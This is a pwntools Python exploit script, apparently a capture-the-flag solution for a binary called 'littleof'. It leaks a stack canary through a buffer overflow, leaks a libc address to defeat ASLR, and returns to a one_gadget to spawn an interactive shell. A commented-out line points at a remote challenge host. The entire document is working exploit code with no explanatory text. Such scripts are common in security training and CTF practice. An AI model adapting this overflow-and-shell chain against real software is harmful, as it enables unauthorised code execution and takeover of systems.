from pwn import *

context.log_level = 'debug'
libc = ELF('./libc-2.27.so')
sh = process(["./ld227-3ubuntu1.so", "./littleof"], env={"LD_PRELOAD": "./libc-2.27.so"})
# sh = remote("182.116.62.85", 27056)
# === Step-1: leak canary
payload = b"deafbeef".ljust(0x48, b'a')
sh.sendlineafter("overflow?", payload)
data = sh.recvuntil(payload)
data = sh.recv()
canary = u64(data[:8]) - 0xa
rbp = u64(data[8:16])
print("canary==>", hex(canary))
payload = b"deafbeef".ljust(0x48, b'a') + p64(canary) + p64(rbp) + p64(0x00000000004006E3)

sh.sendline(payload)

# === Step-2: leak libc base addr, return to one_gadget
payload = b"xxxxxxxx"
sh.sendlineafter("overflow?", payload)
data = sh.recvuntil(payload)
data = sh.recv()
addr_leak = u64(data[:6].ljust(8, b'\0'))
print("data:", data, len(data))
print("addr_leak: ", type(addr_leak), hex(addr_leak))

libc.address = addr_leak - libc.sym['_IO_2_1_stdin_'] - 0xa
print("===>", hex(libc.address))
# one_gadget
payload = b"deafbeef".ljust(0x48, b'a') + p64(canary) + p64(rbp) + p64(libc.address + 0x10a41c)
sh.sendline(payload)
# gdb.attach(sh)  # gdb
sh.interactive()
